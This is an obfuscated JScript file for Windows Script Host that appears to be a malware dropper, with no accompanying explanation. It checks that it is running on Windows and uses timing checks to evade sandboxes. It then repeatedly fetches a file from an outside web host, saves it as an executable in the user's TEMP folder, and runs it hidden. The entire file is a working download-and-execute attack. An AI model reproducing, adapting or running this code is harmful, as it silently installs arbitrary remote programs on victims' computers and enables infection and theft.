var uz = false;
var Jm = "CreateObject";
var n0 = function Pm() {return WScript[Jm]("WScript.Shell");}(), lL = 11;
var E = "MSXML2.XMLHTTP";
var E0 = 2123213;
var a = 0;
function H(OU){n0["Run"](OU, a, a);};
function hM(){return "" + E;};
function g(o, Dh){a = a * 1; return o - Dh;};
function rQ(){return Jm;};
/*@cc_on
  @if (@_win32 || @_win64)
    uz = true;
  @end
@*/
if (uz)
{
var xd = "";
function tH(){return 22;};
var H0 = 0; var Xp = 0;
function ZW()
{
var m = new this["Date"]();
var O = m["getUTCMilliseconds"]();
WScript["Sleep"](tH());
var m = new this["Date"]();
var b = m["getUTCMilliseconds"]();
WScript["Sleep"](tH());
var m = new this["Date"]();
var EL = m["getUTCMilliseconds"]();
var H0 = "Gc";
H0 = g(b, O);
var Xp = "Hu";
Xp = g(EL, b);
xd = "open";
return g(H0, Xp);
}
var q = false;
var vS = false;
for (var U = a; U < tH() * 1; U++){if (ZW() != a){
q = true; 
Xp = "31" + 11 * H0 + Xp; 
vS = true; 
break;
}}
function Os() {return ((q == true) && (q == vS)) ? 1 : a;};
if (q && Os() && vS){
function dw() {return n0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "AYVIBAE8z.exe";};
 pD = hM();
 ZI = WScript[Jm](pD);
 var M = 1;
 while (M){
try {
ZI[xd]("GET", "http://digimacro.com.br/m8isda", false);
ZI["send"]();
oL = "Sleep";
for (;;){WScript[oL](tH() * 11); if (ZI["readystate"] >= 2 * 2) break;};
M = a;
} catch(Fm){};
}
function n(of) {var v = (1, 2, 3, 4, 5, of); return v;};
p = WScript[rQ()]("ADODB.Stream");
pD = p;
pD[xd]();
pD["type"] = n(1);
pD["write"](ZI["ResponseBody"]);
p["position"] = n(a);
pD["Save" + "ToFile"](dw(), 2);
p["c"+"lose"]();
w = dw();
H(w);
}
}

